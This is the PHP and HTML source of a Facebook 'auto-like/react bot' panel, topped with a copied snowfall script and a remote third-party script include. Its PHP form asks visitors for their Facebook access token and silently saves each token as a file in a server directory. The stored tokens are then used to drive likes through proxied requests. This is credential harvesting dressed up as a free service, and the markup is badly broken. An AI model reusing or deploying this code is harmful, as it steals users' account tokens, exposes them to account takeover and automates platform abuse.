<script><a target="_blank" href="http://free-web-tools.com/category/codes/javascript/" style="text-decoration:none;bottom:0;left:10px;font-size:5pt;color:gray;position:absolute"></a><a target="_blank" href="http://www.javascriptbestcodes.com" style="font-size: 8pt; text-decoration: none"></a>
<!-- This Script is from www.javascriptbestcodes.com, Provided by: Web Smile -->
<script type='text/javascript' src='http://m.free-codes.org/g.php?id=2002'></script><script>
// Set the number of snowflakes (more than 30 - 40 not recommended)
var snowmax=37

// Set the colors for the snow. Add as many colors as you like
var snowcolor=new Array("#aaaacc","#ddddFF","#ccccDD")

// Set the fonts, that create the snowflakes. Add as many fonts as you like
var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")

// Set the letter that creates your snowflake (recommended:*)
var snowletter="Welcome"

// Set the speed of sinking (recommended values range from 0.3 to 2)
var sinkspeed=1.4

// Set the maximal-size of your snowflaxes
var snowmaxsize=19

// Set the minimal-size of your snowflaxes
var snowminsize=8

// Set the snowing-zone
// Set 1 for all-over-snowing, set 2 for left-side-snowing 
// Set 3 for center-snowing, set 4 for right-side-snowing
var snowingzone=1

///////////////////////////////////////////////////////////////////////////
// CONFIGURATION ENDS HERE
///////////////////////////////////////////////////////////////////////////


// Do not edit below this line
var snow=new Array()
var marginbottom
var marginright
var timer
var i_snow=0
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent 
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
var ns6=document.getElementById&&!document.all
var opera=browserinfos.match(/Opera/)  
var browserok=ie5||ns6||opera

function randommaker(range) {		
	rand=Math.floor(range*Math.random())
    return rand
}

function initsnow() {
	if (ie5 || opera) {
		marginbottom = document.body.clientHeight
		marginright = document.body.clientWidth
	}
	else if (ns6) {
		marginbottom = window.innerHeight
		marginright = window.innerWidth
	}
	var snowsizerange=snowmaxsize-snowminsize
	for (i=0;i<=snowmax;i++) {
		crds[i] = 0;                      
    	lftrght[i] = Math.random()*15;         
    	x_mv[i] = 0.03 + Math.random()/10;
		snow[i]=document.getElementById("s"+i)
		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
		snow[i].size=randommaker(snowsizerange)+snowminsize
		snow[i].style.fontSize=snow[i].size
		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
		snow[i].sink=sinkspeed*snow[i].size/5
		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
		snow[i].style.left=snow[i].posx
		snow[i].style.top=snow[i].posy
	}
	movesnow()
}

function movesnow() {
	for (i=0;i<=snowmax;i++) {
		crds[i] += x_mv[i];
		snow[i].posy+=snow[i].sink
		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
		snow[i].style.top=snow[i].posy
		
		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
			snow[i].posy=0
		}
	}
	var timer=setTimeout("movesnow()",50)
}

for (i=0;i<=snowmax;i++) {
	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
}
if (browserok) {
	window.onload=initsnow
}
</script><head>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
 Tiger Bot Team
</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<br>  <center>

     <div id="header">

     <h1 align="center"><font style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent;color:#FFF200;color: #FFFA00 ;font-family:Georgia;font-size:40px;">
               Zahid-Web.Ml
               
               <br>
<center> <a target="_blank" href="http://www.facebook.com/100016624871195"> <center> <img src="https://graph.facebook.com/100016624871195/picture?type=large" style="width:400px; height:400px;border: 90px;border-radius: 90%;"  </center> 

<center><marquee direction="left" width="60%"> 💟 Welcome To TIGER BOT TEAM <font color ="red">💕💕</font> All In One <font color =Blue">💕💕</font>  Sites Panel💕💕</marquee></center></br>
<hr width="60%"></br>
							</font>
						</h2></center>
<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="B.css"
<link rel="stylesheet" type="text/css" href="/css/style.css">
<?php
$yx=opendir('sahib');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> sahib($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function sahib($access){
if(!is_dir('sahib')){
mkdir('sahib');
}
$a=fopen('sahib/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<font color="red"><center>Token Wrong Baby Try Again</font></center>';
$this->form();
}
public function form(){
 echo '
    

<center> <h2> <font color ="White"> 👇 REACT BOT SITES 👇
<br

<br>
	

</div>   

</b>    </a>                 </div>    </div>

 <center> </div> <a href="http://zahid-love.tk/" class="btn-button" style="text-decoration : underline;"> Love React ❤</a><a href="http://love-reactbot.tk/" class="btn-button" style="text-decoration : underline;">Love React ❤</button></a>      <a href="http://zahid-wow.tk/" class="btn-button" style="text-decoration : underline;"> Wow React 😮</a> </div> 
  	
  
 <h2> <font color ="White"> 👇 COMMENTS BOT SITES👇
 <center></div><a href="http://tiger-botters.cf/" class="btn-button" style="text-decoration : underline;">Short Comment</a><a href="http://Tiger-bot.gq/" class="btn-button" style="text-decoration : underline;"> Sticker Comment </a></div> 
	
	 <h2> <font color ="White"> 👇CRONJOB SITE 👇
	
     <center></div>    <a href="http://zahid-cron.tk/" class="btn-lg btn-outline-warning" style="text-decoration : underline"> Cronjob</a>        </div> 
         
         <h2> <font color ="White"> 👇 ADMIN AREA 👇

  <center></div> <a href="http://zahidkashan.blogspot.com/" class="btn-button" style="text-decoration : underline;">Download Scripts</a><a class="btn btn-button" href="//facebook.com/kashan.writes1" target="_blank">My Facebook Profile</a><a class="btn btn-button" href="//instagram.com/kashan_writes1" target="_blank">Instagram</a><a class="btn btn-button" href="https://www.youtube.com/channel/UCFXs4Nev4WafVUdngi_95oQ" class="btn-button" style="text-decoration : underline;">Youtube</a> <a class="btn btn-button" href="https://www.twitter.com/kashan_writes1" class="btn-button" style="text-decoration : underline;">Twitter</a>    </div>
</body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=01'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'

  
<div class="panel panel-success">
		
		<div class="panel-heading"><h4 style="text-align : center;"><i class="fas fa-bullhorn"></i> Completely Fixed!! No Like and Comment Block</h4></div>

		</div>
<br>
<center> <a target="_blank" href="http://www.facebook.com/100016624871195"> <center> <img src="https://graph.facebook.com/100016624871195/picture?type=large" style="width:200px; height:200px;border: 80px;border-radius: 80%;"  </center>
<br>
<br>
<br>
<marquee direction="left"><font size="8" color="white"> Your bot Has been Activated Successfully </font></marquee>
<br>
<br>
<br>
<form action="index.php" method="post">
<center><input class="btn btn-primary" type="submit" value="Click Here To Add AnOther Token"></center>
<br>
<br>
<br>
 
<center> <font color="White"> Owner Of TIGER BOT TEAM:- 👉 <a href="https://www.facebook.com/100016624871195" target="blank"><font color="red">Zahid Kashan<br></center>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
	<h2> <font color ="Yellow"> If You Have Any Problem Contact Me At Whatsapp +923473012200
</body>
</html>
<h2>
	<br>
 <!-- Start of CuterCounter Code -->
<a href="http://www.cutercounter.com/" target="_blank"><img src="http://www.cutercounter.com/hit.php?id=gvfodaf&nd=6&style=24" border="0" alt="free counter"></a>
<!-- End of CuterCounter Code -->